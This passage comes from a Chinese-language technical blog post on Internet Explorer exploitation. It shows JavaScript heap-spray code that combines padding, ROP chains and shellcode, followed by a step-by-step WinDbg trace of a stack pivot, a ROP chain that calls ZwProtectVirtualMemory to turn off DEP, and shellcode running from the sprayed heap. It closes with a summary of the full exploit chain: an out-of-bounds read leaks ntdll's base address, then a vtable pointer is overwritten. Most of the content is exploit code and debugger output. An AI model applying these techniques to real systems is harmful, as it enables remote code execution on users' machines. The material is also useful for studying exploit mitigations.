     }
     // [ padding offset ]
     padding = fill.substring(0, 0x5F6);
     // [ fill each chunk with 0x1000 bytes ]
     evilcode = padding + rop_chains + shellcode + fill.substring(0, 0x800 - padding.length - rop_chains.length - shellcode.length);
     // [ repeat the block to 512KB ]
     while (evilcode.length 
    var rect_array = new Array()
    var a = new Array()
    function createRects(){
    for(var i=0; i
rop链的调试过程如下：
    0:014> ba r4 0c0c0c14
    0:014> g
    Breakpoint 0 hit
    eax=0c0c0c0c ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775b5789 esp=0243b1b4 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlAddSIDToBoundaryDescriptor+0x3b1:
    775b5789 94              xchg    eax,esp
    0:005> p
    eax=0243b1b4 ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775b578a esp=0c0c0c0c ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlAddSIDToBoundaryDescriptor+0x3b2:
    775b578a c3              ret
    0:005> p
    eax=0243b1b4 ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775b578a esp=0c0c0c10 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlAddSIDToBoundaryDescriptor+0x3b2:
    775b578a c3              ret
    0:005> p
    eax=0243b1b4 ebx=1264d864 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775a96c9 esp=0c0c0c14 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlLockMemoryBlockLookaside+0x88:
    775a96c9 5b              pop     ebx
    0:005> p
    Breakpoint 0 hit
    eax=0243b1b4 ebx=775b5789 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775a96ca esp=0c0c0c18 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlLockMemoryBlockLookaside+0x89:
    775a96ca c3              ret
    0:005> p
    eax=0243b1b4 ebx=775b5789 ecx=12dadc20 edx=000009e6 esi=1264d878 edi=1264d860
    eip=775e5f18 esp=0c0c0c1c ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!ZwProtectVirtualMemory:
    775e5f18 b8d7000000      mov     eax,0D7h
    可以看到rop链如我们预期的那样运行着．我们再在 0c0c0c40处下断点，应为这里时shellcode的起始地址，我们看看DEP是否关闭成功：
    0:005> bp 0c0c0c40
    0:005> g
    Breakpoint 1 hit
    eax=c0000045 ebx=775b5789 ecx=0c0c0c18 edx=775e70b4 esi=1264d878 edi=1264d860
    eip=0c0c0c40 esp=0c0c0c34 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    0c0c0c40 fc              cld
    0:005> p
    eax=c0000045 ebx=775b5789 ecx=0c0c0c18 edx=775e70b4 esi=1264d878 edi=1264d860
    eip=0c0c0c41 esp=0c0c0c34 ebp=0243b1f0 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    0c0c0c41 e889000000      call    0c0c0ccf
可以看到是成功的，我们已经能执行堆中的数据了^__^ ,此时按下g 我们的计算器就弹出来了．
这样，这个漏洞的漏洞利用就被我们分段的完成了，我们回过头来看看整个漏洞利用过程。首先我们通过数组越界修改对象的属性值地址，读到了一个值，通过这个值计算出了ntdll模块的基地址，并通过该基地址构造出rop链，之后又再次触发了漏洞，修改对象虚表指针，劫持程序执行流，完成了整个漏洞利用。这其中的每一步都是那么精妙，可以说只要稍微有点偏差，整个漏洞利用就会失败。可以说这样的漏洞利用真正的可以配得上＂优雅＂这个词语了。整个漏洞利用的一个连贯过程，metasploit上实现的非常棒，我们来看看效果。
可以看到metasploit把漏洞利用玩的像一件艺术品一样，厉害！
**  
**
**传送门**
* * *
【技术分享】 IE浏览器漏洞利用技术的演变 ( 一） 